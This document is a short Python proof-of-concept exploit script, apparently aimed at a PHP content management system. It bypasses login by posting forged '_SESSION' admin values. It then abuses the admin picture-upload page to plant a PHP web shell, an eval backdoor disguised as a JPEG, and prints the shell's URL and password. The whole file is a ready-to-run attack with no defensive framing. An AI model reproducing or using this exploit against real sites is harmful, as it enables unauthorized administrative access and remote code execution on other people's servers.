#!/usr/bin/env python		
#coding:utf-8

import requests
import urlparse

payload1 = {
	'_SESSION[login_in]':1,
	'_SESSION[admin]':1,
	'_SESSION[login_time]':'99999999999'
	}

def fixurl(url):
	if url.startswith('http://') or url.startswith('https://'):
		return url 
	else:
		url = 'http://'+url
		return url

def poc(url):
	#获取session
	url = fixurl(url)
	t = urlparse.urlparse(url)
	url1 = t.scheme+'://'+t.netloc+'/index.php'
	s = requests.session()
	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
	try:
		s.post(url,data=payload1,headers=headers,timeout=3)
	except:
		return False

	# 文件上传
	url2 = t.scheme+'://'+t.netloc+'/admin/admin_pic.php?nav=main&admin_p_nav=main_info'
	data = {
		'is_thumb':0,
		'thumb_width':300,
		'thumb_height':300,
		'pic_alt':'xx',
		'pic_path':'upload/img/',
		'pic_name':'1',
		'action':'save_edit',
		'id':1,
		'pic_cate':1,
		'pic_ext':'php'
	}
	files = {'new_pic':('1.php','<?php @eval($_POST[1]);?>','image/jpeg')}
	try:
		res = s.post(url2,files=files,data=data,headers=headers,timeout=3)
		#print res.content
		if res.status_code == 200:
			return '[*]shell:'+url+'/upload/img/1.php [password:1]'
			return True
		else:
			print 'maybe patched'
			return False
	except:
		return False


if __name__ == '__main__':
	poc('http://localhost/')